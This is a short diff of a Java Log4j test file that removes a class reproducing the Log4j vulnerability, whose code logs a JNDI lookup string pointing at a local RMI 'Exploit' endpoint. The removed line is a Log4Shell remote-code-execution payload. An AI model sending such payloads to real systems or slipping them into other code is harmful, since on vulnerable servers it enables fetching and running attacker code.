@@ -39,18 +39,4 @@ public class TestLog4j {
     }
 }
 
-// log4j漏洞复现
-class Log4jBug {
-    private static Logger logger = LogManager.getLogger(Log4jBug.class);
-
-    public static void TestLog4j() {
-        logger.info("${jndi:rmi://127.0.0.1:8888/Exploit}");
-    }
-
-    public static void main(String[] args) {
-        TestLog4j();
-    }
-
-}
-
 
